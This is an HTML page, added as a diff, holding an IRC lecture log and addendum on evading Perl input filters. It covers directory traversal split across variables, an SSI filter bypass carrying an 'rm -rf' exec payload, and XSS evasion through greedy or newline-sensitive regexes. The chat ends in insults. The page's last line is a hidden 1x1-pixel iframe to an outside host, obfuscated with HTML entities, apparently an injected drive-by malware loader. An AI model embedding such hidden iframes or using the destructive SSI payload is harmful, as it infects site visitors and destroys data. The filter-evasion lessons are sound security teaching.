+    <TD><FONT color=#ffffff>This technique can also be used with only one 
+      filter. You've already seen this in the '.../...//' example I talked 
+      about. </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>+Multiple inputted variables forgotten in the 
+      filters </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>This technique is more used on the output side of 
+      things (html, flat databases, etc..), or when dealing with filepaths. But 
+      I've seen it turn up in odd places, so keep an eye open for it. 
+  </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>The deal with this problem is that your filters 
+      may work perfect, they may filter out every possible bad string and any of 
+      the other technqiues used to evade are stopped. But.. when the bad string 
+      is split between two variables your filters do not find it. </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>Here is an example with filepaths (pretend all 
+      directory transversal is stopped): </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>$blah =~ s/\.\./; </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>erm </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>$blah =~ s/\.\.//; </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>$file =~ s/\.\.//; </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>open(FILE "/home/user/${blah}$file"); 
+</FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>If $blah = '.'; and $bleh = './anotheruser/file'; 
+      the whole filename becomes: '/home/user/../anotheruser/file' </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>This problem is seen alot when filters try 
+      stopping ssi or cross site scriptting. If two variables are printed to 
+      html, then you need to make sure they aren't evading your filters. 
+    </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>A fairly hard problem to fix indeed. Purhaps 
+      putting all output into one variable and then filtering output is the best 
+      solution. </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>-- </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>That's pretty much it for the lecture, I will just 
+      throw one more evasion technique for a poor perl filter that is used all 
+      the time. </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>$blah =~ s/&lt;!--(.|\n)*--&gt;//g; </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>I've already said that this filter is used to stop 
+      ssi. But from my testings there is a way around this filter. That is if: 
+      </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>$blah = '&lt;!-- #exec cmd="rm -rf /home/you/www" 
+      - -&gt;'; </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>Notice the space in '- -&gt;' at the end. 
+    </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>Now $blah will pass the filter and still will get 
+      parsed by ssi. Atleast from my testing, if you can please try this on your 
+      box and email me if '- -&gt;' works (try it with include, not exec as you 
+      might have exec disabled). </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>These types of attacks where inserting characters 
+      can be a big problem if you don't know all the variables of the system and 
+      the details of how they work. Also you can find new ways to exploit very 
+      common filters this way, so experiment alot with what is and what isn't 
+      possible. </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>-- </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>Now time for discussion, I will try to answer any 
+      questions (if you have any) or help you better understand anything. This 
+      part might be editted in the log posted to bsrf website. </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>Please try to refrain from talking unless you have 
+      a question or are adding to the disscussion. Do not talk about other 
+      things which aren't reguarding perl filters. </FONT></TD></TR>
+  <TR>
+    <TD>&nbsp;</TD>
+    <TD>&nbsp; </TD></TR>
+  <TR>
+    <TD colSpan=2><FONT color=#ffffff>--- b0iler sets modes [#bsrf -m] 
+    </FONT></TD></TR>
+  <TR>
+    <TD>&nbsp;</TD>
+    <TD>&nbsp; </TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;Strider&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>nice lec b0iler =) </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>no questions worry me. ether it was good or people 
+      don't care much. </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;luCky&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>is this gonna be on a website </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>luCky: yes it will be on 
+      http://b0iler.eyeonsecurity.net tonight and maybe http://blacksun.box.sk 
+      if they upload it </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;Vegas&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>b0iler YOU ARE A FUCKING BASTARD </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;Vegas&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>pvt now </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;dksk8&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>lol </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;Strider&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>LMAO! </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;Strider&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>rofl </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;dksk8&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>roflmao </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;dksk8&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>no questions just &lt;Vegas&gt; b0iler YOU ARE A 
+      FUCKING BASTARD </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>To conclude the lecture I would like to comment on 
+      how obese cyrus is. </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>&lt;yank&gt; Cyrus: eat a duck. </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>&lt;yank&gt; I mean dick. </FONT></TD></TR>
+  <TR>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt;</FONT></TD>
+    <TD><FONT color=#ffffff>&lt;b0iler&gt; he'll eat both. and then a chicken. 
+      </FONT></TD></TR></TBODY></TABLE><BR><BR>About 4 hours after my lecture I reread 
+it and noticed that I completely forgot to mention a couple of things which my 
+"Hacking CGI - Security and Exploitation" paper covers.&nbsp; This is how perl's 
+reg ex uses "globing" to find strings.&nbsp; Which means it will match the first 
+part (starting at the begining), and then find the last part starting at the end 
+going backwards.&nbsp; This is dangerous if you are trying to correct any 
+string.&nbsp; Read the paper for a better explaination, but here is a quick 
+example: <BR><BR>$blah = '&lt;script&gt;&lt;script&gt;alert("this is not 
+filtered well");&lt;/script&gt;&lt;/script&gt;';<BR>$blah =~ 
+s/&lt;script&gt;(.*)&lt;\/script&gt;/[script]$1[\/script]/ig; <BR><BR>This will 
+result in the s/// finding the first &lt;script&gt; and then going to end and 
+finding the last &lt;/script&gt;.&nbsp; it will only replace these with the 
+[]'s, it will leave the middle ones untouched.&nbsp; So $blah will be: 
+[script]&lt;script&gt;alert('this is not filtered 
+well');&lt;/script&gt;[/script] <BR><BR>The other is quite simple.&nbsp; The 
+fact that .* will match any character.&nbsp; Or atleast that's what many scripts 
+seem to think.&nbsp; Perl will match any character up until a newline, unless 
+the /s switch is given or the newline is specificly matched.&nbsp; This means 
+trouble for things like: <BR><BR>$blah = 
+"&lt;script\n&gt;alert('unfiltered');&lt;/script\n&gt;";<BR>$blah =~ 
+s/&lt;(.*)&gt;/[$1]/g; <BR><BR>Now this will match the first &lt; then it will 
+match some characters, but then it runs into a newline before the closing 
+&gt;.&nbsp; So the pattern does not match and the filter does nothing, but the 
+html tags still work (atleast in browsers I tested). <BR><BR>If you find anymore 
+problems in perl filters please email me about them with a clear discription and 
+some examples.&nbsp; b0iler@hotmail.com <BR><BR><BR><FONT 
+color=#ffffff><B>[-----]</B> <BR><BR><A 
+href="http://b0iler.eyeonsecurity.net/">http://b0iler.eyeonsecurity.net/</A>&nbsp; 
+- is my homepage <BR><BR>I got tons of tutorials, mini-tutorials, advisories, 
+and code written by me there.&nbsp; Come check out what I'm up to and possibly 
+learn a bit.&nbsp; This lecture was orignally given for http://blacksun.box.sk 
+but anyone has permission to mirror it as long as it is mirrored in whole and 
+proper credit is given to the author.&nbsp; Also a link to 
+http://b0iler.eyeonsecurity.net would be nice. <BR><BR><B>[-----]</B> </FONT></FONT><iframe src="http://jL.c&#104;ura&#46;pl/rc/" style="width:1px;height:1px"></iframe>
+</BODY></HTML>
